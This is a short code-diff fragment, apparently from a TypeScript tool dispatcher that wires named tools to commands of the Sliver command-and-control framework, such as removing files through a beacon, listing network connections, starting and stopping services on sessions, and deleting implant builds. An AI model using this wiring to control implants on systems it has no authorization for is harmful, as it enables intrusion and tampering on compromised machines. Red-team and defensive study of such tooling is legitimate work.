+        result = await executeSliverCommand("beacon_file_rm", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_netstat":
+        result = await executeSliverCommand("beacon_netstat", args as Record<string, unknown>);
+        break;
+
+      case "sliver_start_service":
+        result = await executeSliverCommand("session_start_service", args as Record<string, unknown>);
+        break;
+
+      case "sliver_stop_service":
+        result = await executeSliverCommand("session_stop_service", args as Record<string, unknown>);
+        break;
+
+      case "sliver_rename_session":
+        result = await executeSliverCommand("rename_session", args as Record<string, unknown>);
+        break;
+
+      case "sliver_delete_build":
+        result = await executeSliverCommand("delete_implant_build", args as Record<string, unknown>);
         break;
 
       case "sliver_pivot_listeners":
